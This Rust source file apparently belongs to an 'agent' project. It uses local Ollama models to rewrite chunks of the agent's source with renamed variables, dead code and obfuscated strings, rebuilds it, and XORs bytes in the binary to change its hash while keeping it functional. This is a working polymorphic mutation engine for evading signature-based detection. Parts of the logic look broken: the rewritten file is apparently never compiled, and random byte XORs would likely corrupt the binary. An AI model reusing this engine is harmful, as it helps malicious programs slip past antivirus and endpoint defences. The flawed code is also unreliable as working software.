use std::path::Path;
use std::process::Command;
use std::time::{Duration, SystemTime, UNIX_EPOCH};
use tracing::{error, info};

fn call_ollama(prompt: &str, model: &str) -> Option<String> {
    let response = Command::new("ollama")
        .args(["run", model, prompt])
        .output()
        .ok()?;
    let text = String::from_utf8_lossy(&response.stdout).to_string();
    if text.trim().is_empty() || text.contains("error") {
        return None;
    }
    Some(text)
}

pub fn llm_rewrite(code_snippet: &str, language: &str) -> Option<String> {
    let prompt = format!(
        "[INST] Rewrite this {} code. Keep the exact same functionality but:\n\
         1. Change ALL variable names\n\
         2. Reorder independent statements\n\
         3. Change loop structures (for->while, while->loop)\n\
         4. Inline or extract functions\n\
         5. Add dead code blocks that never execute\n\
         6. Change string literals to obfuscated versions\n\
         Return ONLY the rewritten code block, no explanation.\n\n{} [/INST]",
        language, code_snippet
    );

    call_ollama(&prompt, "codellama:7b")
        .or_else(|| call_ollama(&prompt, "tinyllama"))
}

pub fn llm_mutate_binary(binary: &[u8], agent_name: &str) -> Option<Vec<u8>> {
    let _header = binary.get(..4096)?;
    let body = binary.get(4096..)?;

    let prompt = format!(
        "[INST] You are a binary mutation engine. Given a {} byte {} binary,\n\
         suggest 3 safe byte-level mutations (XOR positions) that change the hash\n\
         but keep the binary functional. Skip the first 4096 bytes (header).\n\
         Respond: pos1:byte1,pos2:byte2,pos3:byte3 [/INST]",
        binary.len(), agent_name
    );

    let response = call_ollama(&prompt, "tinyllama")?;

    let mut mutated = binary.to_vec();
    for part in response.split(',') {
        let parts: Vec<&str> = part.split(':').collect();
        if parts.len() == 2 {
            if let (Ok(pos), Ok(byte)) =
                (parts[0].trim().parse::<usize>(), u8::from_str_radix(parts[1].trim(), 16))
            {
                let idx = 4096 + (pos % body.len());
                if idx < mutated.len() {
                    mutated[idx] ^= byte;
                }
            }
        }
    }

    if mutated == binary {
        return None;
    }

    let diff_count = mutated
        .iter()
        .zip(binary.iter())
        .filter(|(a, b)| a != b)
        .count();
    info!("LLM_MUTATE: {} bytes mutated in {}", diff_count, agent_name);
    Some(mutated)
}

/// Run a full mutation cycle:
/// 1. Read agent source from `src_dir/main.rs`
/// 2. Extract a random function block and send it to Ollama
/// 3. Replace the block with the LLM-rewritten version
/// 4. Compile the mutated source with `cargo build`
/// 5. Copy the new binary to the target path
/// Returns the path to the new binary if successful.
pub fn reactive_cycle(
    agent_src_dir: &str,
    agent_name: &str,
    workspace_dir: &str,
    output_dir: &str,
) -> Option<String> {
    let main_rs = Path::new(agent_src_dir).join("src").join("main.rs");
    let source = std::fs::read_to_string(&main_rs).ok()?;
    let source_len = source.len();

    // Pick a 400-800 byte chunk from the middle third of the file
    // (avoid imports at the top, avoid closing braces at the bottom)
    let chunk_region_start = source_len / 3;
    let chunk_region_end = source_len * 2 / 3;
    let chunk_size = std::cmp::min(600, chunk_region_end - chunk_region_start);
    let chunk_start = chunk_region_start
        + (SystemTime::now()
            .duration_since(UNIX_EPOCH)
            .unwrap()
            .as_millis() as usize
            % (chunk_region_end - chunk_region_start - chunk_size));

    let chunk: &str = &source[chunk_start..chunk_start + chunk_size];

    info!(
        "REACTIVE_CYCLE: mutating {} byte chunk at offset {}",
        chunk_size, chunk_start
    );

    let rewritten = llm_rewrite(chunk, "Rust")?;
    let rewritten = rewritten.trim();

    if rewritten.len() < 50 {
        error!("REACTIVE_CYCLE: LLM returned too short response");
        return None;
    }

    // Replace the chunk in the source
    let new_source = format!("{}{}{}", &source[..chunk_start], rewritten, &source[chunk_start + chunk_size..]);

    // Write mutated source to a variant file
    let variant_rs = Path::new(agent_src_dir).join("src").join("variant.rs");
    std::fs::write(&variant_rs, &new_source).ok()?;

    // Compile with variant
    info!("REACTIVE_CYCLE: compiling mutated {}", agent_name);
    let status = Command::new("cargo")
        .args(["build", "-p", agent_name])
        .current_dir(workspace_dir)
        .status()
        .ok()?;

    if !status.success() {
        error!("REACTIVE_CYCLE: compilation failed");
        // Clean up variant file
        let _ = std::fs::remove_file(&variant_rs);
        return None;
    }

    // Copy the new binary to output dir
    let binary_path = format!(
        "{}/target/debug/{}",
        workspace_dir,
        agent_name.replace('-', "_")
    );
    let ts = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .unwrap()
        .as_secs();
    let variant_path = Path::new(output_dir).join(format!("{}_{}", agent_name, ts));
    std::fs::create_dir_all(output_dir).ok()?;
    std::fs::copy(&binary_path, &variant_path).ok()?;

    // Clean up
    std::fs::remove_file(&variant_rs).ok()?;

    info!(
        "REACTIVE_CYCLE: variant saved to {}",
        variant_path.display()
    );
    Some(variant_path.to_string_lossy().to_string())
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_llm_mutate_no_ollama() {
        let data = vec![0x41u8; 10000];
        let result = llm_mutate_binary(&data, "test");
        assert!(result.is_none() || result.unwrap().len() == data.len());
    }

    #[test]
    fn test_llm_rewrite_no_ollama() {
        // Only test if ollama binary exists; otherwise skip gracefully
        let has_ollama = std::process::Command::new("which")
            .arg("ollama")
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false);
        if !has_ollama {
            // Without Ollama binary, call_ollama returns None
            let result = call_ollama("test", "codellama:7b");
            assert!(result.is_none());
        }
    }
}
